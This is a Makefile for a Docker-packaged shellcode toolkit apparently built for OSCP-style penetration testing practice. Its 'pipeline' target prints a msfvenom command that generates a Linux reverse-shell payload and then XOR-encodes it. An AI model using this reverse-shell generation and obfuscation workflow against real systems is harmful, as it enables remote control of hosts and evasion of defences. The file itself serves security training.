.PHONY: help build run shell test clean pipeline oscp

help:
	@echo "ShellcodingDream - Docker Build System"
	@echo ""
	@echo "Available commands:"
	@echo ""
	@echo "  make build      - Build Docker image"
	@echo "  make run        - Run container with help"
	@echo "  make shell      - Interactive shell in container"
	@echo "  make pipeline   - Run example pipeline"
	@echo "  make oscp       - Show OSCP quick reference"
	@echo "  make clean      - Remove containers/images"
	@echo ""

build:
	docker-compose build

run:
	docker-compose run --rm shellcoding

shell:
	docker-compose run --rm -it shellcoding /bin/bash

pipeline:
	@echo "Running example pipeline..."
	@echo "First, create a test payload:"
	@echo "  msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c > test.hex"
	@echo ""
	docker-compose run --rm shellcoding pipeline --technique xor --input test.hex --platform linux

oscp:
	docker-compose run --rm shellcoding oscp

clean:
	docker-compose down
	docker rmi shellcoding-dream:latest || true
	rm -rf output/ .cache/

test-build: build
	docker-compose run --rm shellcoding list
	@echo "✓ Build successful"

.DEFAULT_GOAL := help
